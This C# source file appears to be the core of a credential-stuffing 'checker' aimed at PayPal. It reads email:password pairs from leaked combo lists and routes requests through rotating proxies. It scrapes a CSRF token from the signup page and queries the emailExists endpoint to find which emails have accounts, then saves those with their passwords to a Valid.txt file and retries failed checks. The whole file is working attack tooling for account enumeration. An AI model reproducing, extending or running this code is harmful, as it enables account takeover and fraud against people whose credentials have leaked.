using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using AuthGG;
using Leaf.xNet;
using ZuttPal;
using Console = Colorful.Console;
namespace ZuttPal
{
	internal class check17
	{
		public static string Path4;
		public static string Path3;
		public static string Path2;
		public static string Path1;
		public static string Path;
		private static ReaderWriterLockSlim locker = new ReaderWriterLockSlim();



		public static void startchecker1()
		{
			for (; ; )
			{
				while (!Checking20.Combo.IsEmpty)
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						if (Checking20.Combo.TryDequeue(out string acc))
						{
							try
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								string account = email + ":" + password;
								httpRequest.Proxy = Checking20.RandomProxies();
								httpRequest.IgnoreProtocolErrors = true;
								httpRequest.KeepAlive = true;
								httpRequest.ConnectTimeout = Program.config.timeout;
								httpRequest.SslProtocols = System.Security.Authentication.SslProtocols.Tls12;
								HttpResponse GetRequest = httpRequest.Get("https://www.paypal.com/in/welcome/signup/");
								string text2 = GetRequest.ToString();
								string key = check17.yey(text2, "data-csrf-token=\"", "\"");
								httpRequest.IgnoreProtocolErrors = true;
								httpRequest.AllowAutoRedirect = true;
								httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
								httpRequest.AddHeader("Pragma", "no-cache");
								httpRequest.AddHeader("Accept", "*/*");
								httpRequest.AddHeader("x-csrf-token", $"{key}");
								string yes = email + ":" + password;
								HttpResponse PostRequest = httpRequest.Post("https://www.paypal.com/welcome/rest/v1/emailExists", "{\"email\":\"" +  email + "\"}", "application/json;charset=UTF-8");
								var post = PostRequest.ToString();
								if (post.Contains("emailExists\":true"))
								{
									Interlocked.Increment(ref Checking20.CheckedLines);
									Interlocked.Increment(ref Checking20.currentCpm);
									Interlocked.Increment(ref Checking20.Hits);
									if (Program.config.printgood == "True")
									{
										Console.WriteLine("[»] Valid - " + account, Color.Green);
									}
									Save(Path + "\\Valid.txt", account);
									break;
								}
								else if (post.Contains("emailExists\":false"))
								{
									Interlocked.Increment(ref Checking20.CheckedLines);
									Interlocked.Increment(ref Checking20.currentCpm);
									Interlocked.Increment(ref Checking20.Bad);
									if (Program.config.printbad == "True")
									{
										Console.WriteLine("[»] Invalid - " + account, Color.Red);
									}
									break;
								}
							}
							catch (Exception)
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								var account = email + password;
								string acc1 = email + ":" + password;
								Checking20.Combo.Enqueue(acc1);
								Interlocked.Increment(ref Checking20.retry);
							}
						}
					}
				}
			}
		}
		public static string yey(string source, string left, string right)
		{
			return source.Split(new string[]
			{
				left
			}, StringSplitOptions.None)[1].Split(new string[]
			{
				right
			}, StringSplitOptions.None)[0];
		}
		public static void Save(string path, string line)
			{
			for (; ; )
			{
				try
				{
					File.AppendAllLines(path ?? "", new List<string>
					{
						line
					}, Encoding.UTF8);
					break;
				}
				catch
				{
				}
			}
		}

		public static string uri = "";

		public static string auther = "";

		public static string printbad = "";

		public static string printlocked = "";

		public static List<string> Tokens = new List<string>();

		public static List<string> Urls = new List<string>();

		public static List<string> Auther = new List<string>();

		public static List<ProxyClient> ProxyList = new List<ProxyClient>();
	}
}
